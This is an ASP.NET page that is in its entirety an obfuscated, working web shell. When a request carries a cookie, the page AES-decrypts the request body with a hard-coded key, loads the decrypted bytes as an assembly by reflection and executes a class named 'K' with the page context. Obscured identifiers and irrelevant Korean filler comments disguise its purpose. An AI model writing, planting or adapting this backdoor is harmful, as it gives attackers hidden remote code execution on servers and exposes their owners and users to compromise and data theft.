<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<script runat="server">
    // 엔트리 포인트
    private void Page_Load(object sender, EventArgs e)
    {
        var h_91a = Request.Cookies;
        // 쿠키가 없으면 아무것도 하지 않습니다.
        if (h_91a != null && h_91a.Count > 0)
        {
            var p_2b8 = new P_Class_2b8();
            p_2b8.m_f3c(this);
        }
    }

    // 이 클래스는 모든 로직을 캡슐화합니다.
    public class P_Class_2b8
    {
        // 배고파요, 치킨 먹고 싶다
        private byte[] g_k_1()
        {
            // 키를 바이트 배열로 반환
            byte[] k_bytes = { 0x63, 0x61, 0x36, 0x33, 0x34, 0x35, 0x37, 0x35, 0x33, 0x38, 0x62, 0x39, 0x62, 0x31, 0x65, 0x30 };
            return k_bytes;
        }

        private byte[] g_d_2(System.Web.HttpRequest r)
        {
            // 오늘 날씨가 좋네요.
            var s = r.InputStream;
            var b = new byte[s.Length];
            s.Read(b, 0, b.Length);
            return b;
        }

        // 주 실행 함수
        public void m_f3c(object ctx)
        {
            // 이 코드는 정말 이해하기 어렵습니다.
            var page_ctx = (System.Web.UI.Page)ctx;
            var d_cont = g_d_2(page_ctx.Request);
            
            if (d_cont.Length > 0)
            {
                var k_val = g_k_1();
                Func<byte[], byte[]> decrypt_lambda = (payload) => {
                    var aes = new RijndaelManaged();
                    var dec = aes.CreateDecryptor(k_val, k_val);
                    return dec.TransformFinalBlock(payload, 0, payload.Length);
                };
                
                // 람다를 사용하여 복호화 실행
                var asm_bytes = decrypt_lambda(d_cont);

                // 리플렉션을 통해 동적으로 실행
                var asm = Assembly.Load(asm_bytes);
                var inst = asm.CreateInstance(Encoding.ASCII.GetString(new byte[]{ 75 })); // "K"
                inst.Equals(ctx);
            }
        }
    }
</script>